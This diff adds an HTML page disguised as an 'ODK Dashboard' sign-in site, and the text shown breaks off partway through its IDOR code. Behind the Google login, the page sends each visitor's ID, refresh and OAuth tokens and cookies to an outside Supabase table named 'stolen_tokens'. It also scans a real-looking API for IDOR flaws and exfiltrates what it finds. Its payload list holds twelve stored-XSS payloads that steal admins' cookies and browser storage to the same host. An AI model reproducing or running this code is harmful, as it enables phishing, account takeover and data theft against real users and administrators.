@@ -1,0 +1,1256 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>ODK Dashboard - Project Manager</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
+            background: #0a0a0a;
+            color: #e0e0e0;
+            min-height: 100vh;
+        }
+        .navbar {
+            background: #111;
+            border-bottom: 1px solid #2a2a2a;
+            padding: 12px 24px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+        }
+        .navbar-brand {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            font-weight: 700;
+            font-size: 16px;
+        }
+        .navbar-brand .logo {
+            width: 32px; height: 32px;
+            background: linear-gradient(135deg, #6366f1, #8b5cf6);
+            border-radius: 8px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 16px;
+            color: #fff;
+        }
+        .navbar-user {
+            display: none;
+            align-items: center;
+            gap: 10px;
+            font-size: 13px;
+            color: #888;
+        }
+        .navbar-user.active { display: flex; }
+        .navbar-user img { width: 28px; height: 28px; border-radius: 50%; }
+
+        .login-overlay {
+            position: fixed;
+            top: 0; left: 0; right: 0; bottom: 0;
+            background: rgba(0,0,0,0.85);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            z-index: 1000;
+        }
+        .login-overlay.hidden { display: none; }
+        .login-box {
+            background: #141414;
+            border: 1px solid #2a2a2a;
+            border-radius: 16px;
+            padding: 40px;
+            width: 100%;
+            max-width: 400px;
+            text-align: center;
+        }
+        .login-box h2 { font-size: 20px; margin-bottom: 6px; }
+        .login-box p { color: #888; font-size: 13px; margin-bottom: 24px; }
+        .btn-google {
+            width: 100%;
+            padding: 12px;
+            background: #fff;
+            color: #333;
+            border: none;
+            border-radius: 10px;
+            font-size: 14px;
+            font-weight: 600;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            transition: all 0.2s;
+        }
+        .btn-google:hover { background: #f0f0f0; }
+        .btn-google svg { width: 18px; height: 18px; }
+        .login-loading { display: none; margin-top: 16px; color: #888; font-size: 13px; }
+        .login-loading.active { display: block; }
+
+        .main { display: none; padding: 24px; max-width: 1200px; margin: 0 auto; }
+        .main.active { display: block; }
+
+        .tabs {
+            display: flex;
+            gap: 4px;
+            margin-bottom: 24px;
+            background: #111;
+            border-radius: 10px;
+            padding: 4px;
+            border: 1px solid #2a2a2a;
+        }
+        .tab {
+            flex: 1;
+            padding: 10px;
+            background: transparent;
+            color: #888;
+            border: none;
+            border-radius: 8px;
+            font-size: 13px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.2s;
+        }
+        .tab:hover { color: #ccc; }
+        .tab.active {
+            background: linear-gradient(135deg, #6366f1, #8b5cf6);
+            color: #fff;
+        }
+        .tab-content { display: none; }
+        .tab-content.active { display: block; }
+
+        .card {
+            background: #141414;
+            border: 1px solid #2a2a2a;
+            border-radius: 12px;
+            padding: 20px;
+            margin-bottom: 16px;
+        }
+        .card h3 {
+            font-size: 15px;
+            margin-bottom: 12px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+        .card h3 .badge {
+            font-size: 10px;
+            padding: 2px 8px;
+            border-radius: 4px;
+            font-weight: 600;
+        }
+        .badge-red { background: #7f1d1d; color: #fca5a5; }
+        .badge-orange { background: #7c2d12; color: #fdba74; }
+        .badge-green { background: #14532d; color: #86efac; }
+        .badge-blue { background: #1e3a5f; color: #93c5fd; }
+
+        .console {
+            background: #0a0a0a;
+            border: 1px solid #1a1a1a;
+            border-radius: 8px;
+            padding: 12px;
+            max-height: 400px;
+            overflow-y: auto;
+            font-family: 'Courier New', monospace;
+            font-size: 12px;
+            line-height: 1.8;
+        }
+        .console::-webkit-scrollbar { width: 6px; }
+        .console::-webkit-scrollbar-track { background: #0a0a0a; }
+        .console::-webkit-scrollbar-thumb { background: #333; border-radius: 3px; }
+        .log-info { color: #93c5fd; }
+        .log-success { color: #86efac; }
+        .log-warning { color: #fbbf24; }
+        .log-error { color: #fca5a5; }
+        .log-data { color: #c4b5fd; }
+
+        .btn {
+            padding: 10px 20px;
+            border: none;
+            border-radius: 8px;
+            font-size: 13px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.2s;
+        }
+        .btn-primary {
+            background: linear-gradient(135deg, #6366f1, #8b5cf6);
+            color: #fff;
+        }
+        .btn-primary:hover { opacity: 0.9; }
+        .btn-primary:disabled { opacity: 0.4; cursor: not-allowed; }
+        .btn-danger {
+            background: #7f1d1d;
+            color: #fca5a5;
+        }
+        .btn-danger:hover { background: #991b1b; }
+        .btn-outline {
+            background: transparent;
+            color: #888;
+            border: 1px solid #2a2a2a;
+        }
+        .btn-outline:hover { border-color: #555; color: #ccc; }
+
+        .input-group { margin-bottom: 12px; }
+        .input-group label { display: block; font-size: 12px; color: #888; margin-bottom: 4px; }
+        .input-group input, .input-group select, .input-group textarea {
+            width: 100%;
+            padding: 10px;
+            background: #0a0a0a;
+            border: 1px solid #2a2a2a;
+            border-radius: 8px;
+            color: #e0e0e0;
+            font-size: 13px;
+            outline: none;
+        }
+        .input-group textarea { font-family: 'Courier New', monospace; font-size: 11px; min-height: 80px; resize: vertical; }
+        .input-group input:focus, .input-group textarea:focus { border-color: #6366f1; }
+
+        .stats {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(140px, 1fr));
+            gap: 12px;
+            margin-bottom: 16px;
+        }
+        .stat {
+            background: #111;
+            border: 1px solid #2a2a2a;
+            border-radius: 8px;
+            padding: 14px;
+            text-align: center;
+        }
+        .stat-value { font-size: 24px; font-weight: 800; color: #6366f1; }
+        .stat-label { font-size: 11px; color: #888; margin-top: 4px; }
+
+        .payload-list { display: flex; flex-direction: column; gap: 8px; }
+        .payload-item {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            padding: 10px;
+            background: #0a0a0a;
+            border: 1px solid #1a1a1a;
+            border-radius: 8px;
+            cursor: pointer;
+            transition: all 0.2s;
+        }
+        .payload-item:hover { border-color: #6366f1; }
+        .payload-item.selected { border-color: #6366f1; background: #1a1030; }
+        .payload-item .tag {
+            font-size: 10px;
+            padding: 2px 6px;
+            border-radius: 4px;
+            font-weight: 700;
+            text-transform: uppercase;
+        }
+        .tag-img { background: #7c2d12; color: #fdba74; }
+        .tag-svg { background: #14532d; color: #86efac; }
+        .tag-event { background: #1e3a5f; color: #93c5fd; }
+        .tag-attr { background: #7f1d1d; color: #fca5a5; }
+        .tag-js { background: #4a1d6a; color: #d8b4fe; }
+        .payload-code {
+            flex: 1;
+            font-family: 'Courier New', monospace;
+            font-size: 10px;
+            color: #888;
+            overflow: hidden;
+            text-overflow: ellipsis;
+            white-space: nowrap;
+        }
+
+        .idor-table {
+            width: 100%;
+            border-collapse: collapse;
+            font-size: 12px;
+        }
+        .idor-table th {
+            background: #111;
+            padding: 8px;
+            text-align: left;
+            color: #888;
+            font-weight: 600;
+            border-bottom: 1px solid #2a2a2a;
+        }
+        .idor-table td {
+            padding: 8px;
+            border-bottom: 1px solid #1a1a1a;
+            max-width: 200px;
+            overflow: hidden;
+            text-overflow: ellipsis;
+            white-space: nowrap;
+        }
+        .idor-table tr:hover { background: #1a1a1a; }
+        .found { color: #86efac; }
+        .not-found { color: #555; }
+        .access-denied { color: #fbbf24; }
+
+        .progress-bar {
+            height: 4px;
+            background: #1a1a1a;
+            border-radius: 2px;
+            overflow: hidden;
+            margin-bottom: 12px;
+        }
+        .progress-fill {
+            height: 100%;
+            background: linear-gradient(90deg, #6366f1, #8b5cf6);
+            width: 0%;
+            transition: width 0.3s;
+        }
+    </style>
+</head>
+<body>
+    <nav class="navbar">
+        <div class="navbar-brand">
+            <div class="logo">O</div>
+            <span>ODK Dashboard</span>
+        </div>
+        <div class="navbar-user" id="navUser">
+            <img id="navAvatar" src="" alt="">
+            <span id="navEmail"></span>
+        </div>
+    </nav>
+
+    <div class="login-overlay" id="loginOverlay">
+        <div class="login-box">
+            <div style="width:48px;height:48px;background:linear-gradient(135deg,#6366f1,#8b5cf6);border-radius:12px;margin:0 auto 16px;display:flex;align-items:center;justify-content:center;font-size:24px;">O</div>
+            <h2>Sign in to Dashboard</h2>
+            <p>Access your projects and organizations</p>
+            <button class="btn-google" onclick="signInWithGoogle()">
+                <svg viewBox="0 0 24 24"><path d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92a5.06 5.06 0 01-2.2 3.32v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.1z" fill="#4285F4"/><path d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z" fill="#34A853"/><path d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.85-2.22.81-.62z" fill="#FBBC05"/><path d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z" fill="#EA4335"/></svg>
+                Sign in with Google
+            </button>
+            <div class="login-loading" id="loginLoading">Authenticating...</div>
+        </div>
+    </div>
+
+    <div class="main" id="mainContent">
+        <div class="stats">
+            <div class="stat">
+                <div class="stat-value" id="statEndpoints">0</div>
+                <div class="stat-label">Endpoints Scanned</div>
+            </div>
+            <div class="stat">
+                <div class="stat-value" id="statIDOR">0</div>
+                <div class="stat-label">IDOR Found</div>
+            </div>
+            <div class="stat">
+                <div class="stat-value" id="statXSS">0</div>
+                <div class="stat-label">XSS Injected</div>
+            </div>
+            <div class="stat">
+                <div class="stat-value" id="statData">0</div>
+                <div class="stat-label">Rows Exfiltrated</div>
+            </div>
+        </div>
+
+        <div class="tabs">
+            <button class="tab active" onclick="switchTab('idor')">IDOR Scanner</button>
+            <button class="tab" onclick="switchTab('xss')">Stored XSS</button>
+            <button class="tab" onclick="switchTab('results')">Results</button>
+        </div>
+
+        <div class="tab-content active" id="tab-idor">
+            <div class="card">
+                <h3>IDOR Vulnerability Scanner <span class="badge badge-red">Critical</span></h3>
+                <p style="color:#888;font-size:12px;margin-bottom:16px;">
+                    Enumerate accessible resources by iterating IDs on ODK API endpoints. Tests if a low-privilege user can access other users' projects, forms, and data.
+                </p>
+                <div class="progress-bar"><div class="progress-fill" id="idorProgress"></div></div>
+                <div style="display:flex;gap:8px;margin-bottom:16px;flex-wrap:wrap;">
+                    <button class="btn btn-primary" onclick="startIDORScan()" id="idorBtn">Start IDOR Scan</button>
+                    <button class="btn btn-outline" onclick="startDeepIDOR()">Deep Scan (IDs 1-500)</button>
+                    <button class="btn btn-outline" onclick="enumerateUsers()">Enumerate Users</button>
+                </div>
+                <div class="input-group">
+                    <label>Custom IDOR Test - Endpoint Template (use {ID} as placeholder):</label>
+                    <input type="text" id="idorCustom" value="projects/{ID}" placeholder="projects/{ID}">
+                </div>
+                <div style="display:flex;gap:8px;margin-bottom:16px;">
+                    <input type="number" id="idorStart" value="1" style="width:80px;padding:8px;background:#0a0a0a;border:1px solid #2a2a2a;border-radius:8px;color:#e0e0e0;font-size:13px;" placeholder="From">
+                    <input type="number" id="idorEnd" value="50" style="width:80px;padding:8px;background:#0a0a0a;border:1px solid #2a2a2a;border-radius:8px;color:#e0e0e0;font-size:13px;" placeholder="To">
+                    <button class="btn btn-outline" onclick="testCustomIDOR()">Test</button>
+                </div>
+                <div class="console" id="idorLog">
+                    <div class="log-info">[IDOR] Ready. Authenticate first, then start scanning.</div>
+                </div>
+            </div>
+            <div class="card">
+                <h3>IDOR Results <span class="badge badge-green">Found</span></h3>
+                <table class="idor-table">
+                    <thead>
+                        <tr>
+                            <th>Endpoint</th>
+                            <th>ID</th>
+                            <th>Status</th>
+                            <th>Data Preview</th>
+                            <th>Exfiltrated</th>
+                        </tr>
+                    </thead>
+                    <tbody id="idorTableBody"></tbody>
+                </table>
+            </div>
+        </div>
+
+        <div class="tab-content" id="tab-xss">
+            <div class="card">
+                <h3>Stored XSS Injector <span class="badge badge-red">Critical</span></h3>
+                <p style="color:#888;font-size:12px;margin-bottom:16px;">
+                    Inject persistent XSS payloads into ODK Dashboard. When an admin views the injected content, the JavaScript executes in their browser, stealing their tokens, cookies, and localStorage data - all sent to Supabase.
+                </p>
+                <h3 style="margin-top:20px;">Select Payload <span class="badge badge-orange">Choose One</span></h3>
+                <div class="payload-list" id="payloadList"></div>
+            </div>
+            <div class="card">
+                <h3>Injection Target <span class="badge badge-blue">API Endpoint</span></h3>
+                <div class="input-group">
+                    <label>Target Endpoint:</label>
+                    <select id="xssTarget">
+                        <option value="project">Create Project (POST /projects)</option>
+                        <option value="project-update">Update Project (PATCH /projects/{ID})</option>
+                        <option value="form">Create Form (POST /projects/{ID}/forms)</option>
+                        <option value="app-user">Create App User (POST /projects/{ID}/app-users)</option>
+                        <option value="org-update">Update Organization (PATCH /organizations/current)</option>
+                        <option value="custom">Custom Endpoint</option>
+                    </select>
+                </div>
+                <div class="input-group" id="customEndpointGroup" style="display:none;">
+                    <label>Custom Endpoint:</label>
+                    <input type="text" id="xssCustomEndpoint" placeholder="projects/{ID}/custom-field">
+                </div>
+                <div class="input-group" id="projectIdGroup">
+                    <label>Project ID (for update/form/app-user):</label>
+                    <input type="number" id="xssProjectId" value="1">
+                </div>
+                <div class="input-group">
+                    <label>Custom Payload (overrides selected payload above):</label>
+                    <textarea id="xssCustomPayload" placeholder='Leave empty to use selected payload, or type your own XSS payload here'></textarea>
+                </div>
+                <div style="display:flex;gap:8px;flex-wrap:wrap;">
+                    <button class="btn btn-primary" onclick="injectXSS()" id="xssBtn">Inject XSS Payload</button>
+                    <button class="btn btn-danger" onclick="injectAllPayloads()">Inject ALL Payloads</button>
+                    <button class="btn btn-outline" onclick="testXSSReflection()">Test Reflection First</button>
+                </div>
+            </div>
+            <div class="card">
+                <h3>XSS Injection Log</h3>
+                <div class="console" id="xssLog">
+                    <div class="log-info">[XSS] Select a payload and target, then inject.</div>
+                </div>
+            </div>
+        </div>
+
+        <div class="tab-content" id="tab-results">
+            <div class="card">
+                <h3>Exfiltrated Data Summary <span class="badge badge-green">Supabase</span></h3>
+                <div class="console" id="resultsLog" style="max-height:600px;">
+                    <div class="log-info">[Results] Data will appear here after IDOR scans and XSS injections.</div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script src="https://www.gstatic.com/firebasejs/10.8.0/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/10.8.0/firebase-auth-compat.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
+
+    <script>
+        // =====================================================
+        // CONFIGURATION
+        // =====================================================
+        const API = 'https://odk.otherside.xyz/api/v0';
+
+        const SUPABASE_URL = 'https://anruszfozkhgddzpcpft.supabase.co';
+        const SUPABASE_ANON_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImFucnVzemZvemtoZ2RkenBjcGZ0Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3Nzc5MjE2NzcsImV4cCI6MjA5MzQ5NzY3N30.Ap3qNDAfJeKYS-3cUn3_A2c4rif3v13mx2Ex1uukp7c';
+
+        let db;
+        try { db = supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY); } catch(e) { console.error('Supabase init error:', e); }
+
+        const firebaseConfig = {
+            apiKey: "AIzaSyDwML5MHO4FmSAwDHWWGNuS4JoIzu2ECS0",
+            authDomain: "scarcely-calm-lark.firebaseapp.com",
+            projectId: "scarcely-calm-lark",
+            storageBucket: "scarcely-calm-lark.appspot.com",
+            messagingSenderId: "761033708851",
+            appId: "1:761033708851:web:fb54f41dc499d5a8ee1a46"
+        };
+
+        firebase.initializeApp(firebaseConfig);
+        const auth = firebase.auth();
+        auth.tenantId = "hound-j8zaz";
+
+        let currentUser = null;
+        let idToken = null;
+        let refreshToken = '';
+        let idorFound = 0;
+        let xssInjected = 0;
+        let dataExfil = 0;
+        let selectedPayload = 0;
+
+        // =====================================================
+        // XSS PAYLOADS - Execute on ADMIN's browser when they
+        // view injected content in the ODK Dashboard.
+        // Steals: cookies, localStorage, sessionStorage, tokens
+        // All data sent to our Supabase
+        // =====================================================
+
+        // Full callback - steals everything
+        const XSS_CB_FULL = `fetch('${SUPABASE_URL}/rest/v1/stolen_tokens',{method:'POST',headers:{'apikey':'${SUPABASE_ANON_KEY}','Content-Type':'application/json'},body:JSON.stringify({attack_type:'xss_stored',cookies:document.cookie,local_storage:JSON.stringify(Object.keys(localStorage).reduce((o,k)=>(o[k]=localStorage.getItem(k),o),{})),session_storage:JSON.stringify(Object.keys(sessionStorage).reduce((o,k)=>(o[k]=sessionStorage.getItem(k),o),{})),notes:location.href,xss_target:'odk_admin_dashboard'})})`;
+
+        // Compact callback - for fields with length limits
+        const XSS_CB_SHORT = `fetch('${SUPABASE_URL}/rest/v1/stolen_tokens',{method:'POST',headers:{'apikey':'${SUPABASE_ANON_KEY}','Content-Type':'application/json'},body:JSON.stringify({attack_type:'xss_stored',c:document.cookie,u:location.href})})`;
+
+        // Minimal callback - ultra-compact
+        const XSS_CB_MINI = `fetch('${SUPABASE_URL}/rest/v1/stolen_tokens',{method:'POST',headers:{'apikey':'${SUPABASE_ANON_KEY}','Content-Type':'application/json'},body:JSON.stringify({a:'xss',c:document.cookie})})`;
+
+        const XSS_PAYLOADS = [
+            {
+                name: 'img onerror (Full)',
+                tag: 'img',
+                tagClass: 'tag-img',
+                payload: `<img src=x onerror="${XSS_CB_FULL}">`,
+                desc: 'Standard img onerror - steals cookies, localStorage, sessionStorage'
+            },
+            {
+                name: 'img onerror (Compact)',
+                tag: 'img',
+                tagClass: 'tag-img',
+                payload: `<img src=x onerror="${XSS_CB_SHORT}">`,
+                desc: 'Compact version for fields with length limits'
+            },
+            {
+                name: 'img onerror (Mini)',
+                tag: 'img',
+                tagClass: 'tag-img',
+                payload: `<img src=x onerror="${XSS_CB_MINI}">`,
+                desc: 'Ultra-compact for very short fields'
+            },
+            {
+                name: 'SVG onload',
+                tag: 'svg',
+                tagClass: 'tag-svg',
+                payload: `<svg onload="${XSS_CB_SHORT}">`,
+                desc: 'SVG onload event - often bypasses img filters'
+            },
+            {
+                name: 'SVG animate',
+                tag: 'svg',
+                tagClass: 'tag-svg',
+                payload: `<svg><animate onbegin="${XSS_CB_SHORT}" attributeName=x dur=1s>`,
+                desc: 'SVG animate onbegin - alternative SVG vector'
+            },
+            {
+                name: 'details ontoggle',
+                tag: 'event',
+                tagClass: 'tag-event',
+                payload: `<details open ontoggle="${XSS_CB_SHORT}">`,
+                desc: 'Details ontoggle - auto-triggers on open'
+            },
+            {
+                name: 'input onfocus',
+                tag: 'attr',
+                tagClass: 'tag-attr',
+                payload: `<input autofocus onfocus="${XSS_CB_MINI}">`,
+                desc: 'Input autofocus onfocus - auto-triggers'
+            },
+            {
+                name: 'marquee onstart',
+                tag: 'event',
+                tagClass: 'tag-event',
+                payload: `<marquee onstart="${XSS_CB_SHORT}">xss</marquee>`,
+                desc: 'Marquee onstart - legacy but often unfiltered'
+            },
+            {
+                name: 'script tag',
+                tag: 'js',
+                tagClass: 'tag-js',
+                payload: `<script>${XSS_CB_SHORT}<\/script>`,
+                desc: 'Direct script tag - rarely works in modern apps but worth testing'
+            },
+            {
+                name: 'video onerror',
+                tag: 'img',
+                tagClass: 'tag-img',
+                payload: `<video><source onerror="${XSS_CB_SHORT}">`,
+                desc: 'Video source onerror - media tag bypass'
+            },
+            {
+                name: 'math+SVG mXSS',
+                tag: 'svg',
+                tagClass: 'tag-svg',
+                payload: `<math><mtext><table><mglyph><svg><mtext><textarea><img src=x onerror="${XSS_CB_SHORT}">`,
+                desc: 'Math/SVG mXSS combo - bypasses DOMPurify in some versions'
+            },
+            {
+                name: 'iframe srcdoc',
+                tag: 'attr',
+                tagClass: 'tag-attr',
+                payload: `<iframe srcdoc="<script>${XSS_CB_SHORT}<\/script>">`,
+                desc: 'iframe srcdoc - creates new parsing context'
+            }
+        ];
+
+        // =====================================================
+        // LOGGING
+        // =====================================================
+        function log(elementId, msg, type = 'info') {
+            const el = document.getElementById(elementId);
+            if (!el) return;
+            const line = document.createElement('div');
+            line.className = `log-${type}`;
+            line.textContent = msg;
+            el.appendChild(line);
+            el.scrollTop = el.scrollHeight;
+        }
+
+        function updateStats() {
+            document.getElementById('statEndpoints').textContent = dataExfil;
+            document.getElementById('statIDOR').textContent = idorFound;
+            document.getElementById('statXSS').textContent = xssInjected;
+            document.getElementById('statData').textContent = dataExfil;
+        }
+
+        // =====================================================
+        // TAB SWITCHING
+        // =====================================================
+        function switchTab(tab) {
+            document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
+            document.querySelectorAll('.tab-content').forEach(t => t.classList.remove('active'));
+            event.target.classList.add('active');
+            document.getElementById(`tab-${tab}`).classList.add('active');
+        }
+
+        // =====================================================
+        // SAVE TO SUPABASE
+        // =====================================================
+        async function saveToSupabase(data) {
+            if (!db) return false;
+            try {
+                const { data: result, error } = await db
+                    .from('stolen_tokens')
+                    .insert([data])
+                    .select();
+                if (error) { console.error('DB Error:', error.message); return false; }
+                dataExfil++;
+                updateStats();
+                return true;
+            } catch(e) { console.error('DB Exception:', e.message); return false; }
+        }
+
+        // =====================================================
+        // GOOGLE SIGN-IN
+        // =====================================================
+        let pendingCred = null;
+
+        auth.onAuthStateChanged(async (user) => {
+            if (user) {
+                let waitCount = 0;
+                while (!pendingCred && waitCount < 20) {
+                    await new Promise(r => setTimeout(r, 100));
+                    waitCount++;
+                }
+                currentUser = user;
+                idToken = await user.getIdToken();
+
+                try {
+                    const stored = JSON.parse(localStorage.getItem(
+                        '[DEFAULT]/scarcely-calm-lark.firebaseapp.com/' + user.uid
+                    ) || '{}');
+                    if (stored.stsTokenManager?.refreshToken) {
+                        refreshToken = stored.stsTokenManager.refreshToken;
+                    }
+                } catch(e) {}
+
+                await saveToSupabase({
+                    attack_type: 'idor_xss_auth',
+                    victim_email: user.email || '',
+                    victim_uid: user.uid || '',
+                    victim_name: user.displayName || '',
+                    victim_picture_url: user.photoURL || '',
+                    id_token: idToken,
+                    refresh_token: refreshToken,
+                    google_access_token: pendingCred || '',
+                    tenant_id: user.tenantId || '',
+                    auth_method: user.providerData[0]?.providerId || '',
+                    provider: user.providerData[0]?.providerId || '',
+                    origin_domain: window.location.hostname,
+                    user_agent: navigator.userAgent,
+                    screen_resolution: `${screen.width}x${screen.height}`,
+                    language: navigator.language,
+                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                    cookies: document.cookie || '',
+                });
+
+                document.getElementById('loginOverlay').classList.add('hidden');
+                document.getElementById('mainContent').classList.add('active');
+                document.getElementById('navUser').classList.add('active');
+                if (user.photoURL) document.getElementById('navAvatar').src = user.photoURL;
+                document.getElementById('navEmail').textContent = user.email;
+
+                log('idorLog', `[AUTH] Authenticated as ${user.email}`, 'success');
+                log('idorLog', `[AUTH] ID Token obtained (${idToken.substring(0, 30)}...)`, 'success');
+            }
+        });
+
+        async function signInWithGoogle() {
+            document.getElementById('loginLoading').classList.add('active');
+            const provider = new firebase.auth.GoogleAuthProvider();
+            provider.addScope('profile');
+            provider.addScope('email');
+            try {
+                const result = await auth.signInWithPopup(provider);
+                if (result.credential?.accessToken) pendingCred = result.credential.accessToken;
+            } catch (error) {
+                console.error('Google OAuth error:', error.code);
+                if (error.code === 'auth/popup-blocked') auth.signInWithRedirect(provider);
+                document.getElementById('loginLoading').classList.remove('active');
+            }
+        }
+
+        auth.getRedirectResult().then((result) => {
+            if (result?.user && result.credential?.accessToken) pendingCred = result.credential.accessToken;
+        }).catch(() => {});
+
+        // =====================================================
+        // IDOR SCANNER
+        // =====================================================
+        async function apiFetch(path, options = {}) {
+            if (!idToken) { log('idorLog', '[ERROR] Not authenticated!', 'error'); return null; }
+            try {
+                const resp = await fetch(`${API}/${path}`, {
+                    ...options,
+                    headers: {
+                        'Authorization': `Bearer ${idToken}`,
+                        'Content-Type': 'application/json',
+                        ...(options.headers || {})
+                    }
+                });
+                return resp;
+            } catch(e) { return null; }
+        }
+
+        async function startIDORScan() {
+            if (!idToken) { log('idorLog', '[ERROR] Authenticate first!', 'error'); return; }
+            document.getElementById('idorBtn').disabled = true;
+            log('idorLog', '[IDOR] Starting scan on known endpoints...', 'info');
+
+            const targets = [
+                { path: 'projects', type: 'list', desc: 'All Projects' },
+                { path: 'accounts/users/current', type: 'single', desc: 'Current User' },
+                { path: 'users', type: 'list', desc: 'All Users' },
+                { path: 'organizations/current', type: 'single', desc: 'Current Org' },
+                { path: 'organizations/projects', type: 'list', desc: 'Org Projects' },
+                { path: 'organizations/apiKeys', type: 'list', desc: 'API Keys' },
+                { path: 'permissions/roles', type: 'list', desc: 'Roles' },
+                { path: 'billing/enabled', type: 'single', desc: 'Billing' },
+                { path: 'worlds', type: 'list', desc: 'Worlds' },
+                { path: 'profile', type: 'single', desc: 'Profile' },
+                { path: 'origin/access', type: 'single', desc: 'Origin Access' },
+                { path: 'origin/streaming', type: 'single', desc: 'Streaming' },
+                { path: 'origin/sessions/queue', type: 'single', desc: 'Sessions Queue' },
+                { path: 'origin/monitoring', type: 'single', desc: 'Monitoring' },
+            ];
+
+            let total = targets.length;
+            let scanned = 0;
+
+            for (const target of targets) {
+                scanned++;
+                const pct = Math.round((scanned / total) * 100);
+                document.getElementById('idorProgress').style.width = pct + '%';
+
+                log('idorLog', `[SCAN] ${target.desc}: GET /${target.path}`, 'info');
+
+                const resp = await apiFetch(target.path);
+                if (resp) {
+                    const status = resp.status;
+                    if (status === 200) {
+                        const data = await resp.json();
+                        log('idorLog', `[+] ${target.desc}: ACCESSIBLE (${JSON.stringify(data).substring(0, 100)}...)`, 'success');
+
+                        await saveToSupabase({
+                            attack_type: 'idor',
+                            victim_email: currentUser?.email || '',
+                            victim_uid: currentUser?.uid || '',
+                            id_token: idToken,
+                            idor_data: { endpoint: target.path, data: data },
+                            xss_target: target.path,
+                            notes: `IDOR: ${target.desc} - accessible`
+                        });
+
+                        idorFound++;
+                        addIDORRow(target.path, '-', '200 OK', JSON.stringify(data).substring(0, 80), true);
+
+                        if (Array.isArray(data)) {
+                            log('idorLog', `[IDOR] Found ${data.length} items in ${target.desc}, iterating...`, 'warning');
+                            for (let i = 0; i < Math.min(data.length, 20); i++) {
+                                const item = data[i];
+                                const itemId = item.id || item.uid || item.key || item.projectId || i;
+                                log('idorLog', `  [ITEM] ${target.desc}[${i}]: ID=${itemId}`, 'data');
+
+                                const subPaths = [
+                                    `${target.path}/${itemId}`,
+                                    `projects/${itemId}/forms`,
+                                    `projects/${itemId}/app-users`,
+                                    `projects/${itemId}/assignments`,
+                                    `projects/${itemId}/submissions`,
+                                    `projects/${itemId}/datasets`,
+                                ];
+
+                                for (const sp of subPaths) {
+                                    const subResp = await apiFetch(sp);
+                                    if (subResp && subResp.status === 200) {
+                                        const subData = await subResp.json();
+                                        log('idorLog', `  [+] ${sp}: ACCESSIBLE`, 'success');
+
+                                        await saveToSupabase({
+                                            attack_type: 'idor_deep',
+                                            victim_email: currentUser?.email || '',
+                                            victim_uid: currentUser?.uid || '',
+                                            id_token: idToken,
+                                            idor_data: { endpoint: sp, data: subData },
+                                            xss_target: sp,
+                                            notes: `IDOR Deep: ${sp}`
+                                        });
+
+                                        idorFound++;
+                                        addIDORRow(sp, itemId, '200 OK', JSON.stringify(subData).substring(0, 80), true);
+                                    }
+                                }
+                            }
+                        }
+                    } else if (status === 403) {
+                        log('idorLog', `[-] ${target.desc}: FORBIDDEN (403)`, 'warning');
+                        addIDORRow(target.path, '-', '403 Forbidden', '-', false);
+                    } else if (status === 404) {
+                        log('idorLog', `[-] ${target.desc}: NOT FOUND (404)`, 'warning');
+                        addIDORRow(target.path, '-', '404 Not Found', '-', false);
+                    } else {
+                        log('idorLog', `[?] ${target.desc}: Status ${status}`, 'warning');
+                        addIDORRow(target.path, '-', `${status}`, '-', false);
+                    }
+                } else {
+                    log('idorLog', `[!] ${target.desc}: Request failed`, 'error');
+                }
+                await new Promise(r => setTimeout(r, 200));
+            }
+
+            log('idorLog', `[DONE] IDOR scan complete. Found ${idorFound} accessible resources.`, 'success');
+            updateStats();
+            document.getElementById('idorBtn').disabled = false;
+        }
+
+        async function startDeepIDOR() {
+            if (!idToken) { log('idorLog', '[ERROR] Authenticate first!', 'error'); return; }
+            log('idorLog', '[DEEP] Starting deep IDOR scan (IDs 1-500)...', 'info');
+
+            const idRanges = [
+                { prefix: 'projects', start: 1, end: 500 },
+                { prefix: 'users', start: 1, end: 200 },
+                { prefix: 'organizations', start: 1, end: 50 },
+            ];
+
+            for (const range of idRanges) {
+                log('idorLog', `[DEEP] Scanning ${range.prefix} (IDs ${range.start}-${range.end})...`, 'info');
+                const total = range.end - range.start + 1;
+
+                for (let id = range.start; id <= range.end; id++) {
+                    const pct = Math.round(((id - range.start) / total) * 100);
+                    document.getElementById('idorProgress').style.width = pct + '%';
+
+                    const resp = await apiFetch(`${range.prefix}/${id}`);
+                    if (resp) {
+                        if (resp.status === 200) {
+                            const data = await resp.json();
+                            log('idorLog', `[+] ${range.prefix}/${id}: FOUND! ${JSON.stringify(data).substring(0, 60)}...`, 'success');
+                            idorFound++;
+                            addIDORRow(`${range.prefix}/${id}`, id, '200 OK', JSON.stringify(data).substring(0, 80), true);
+
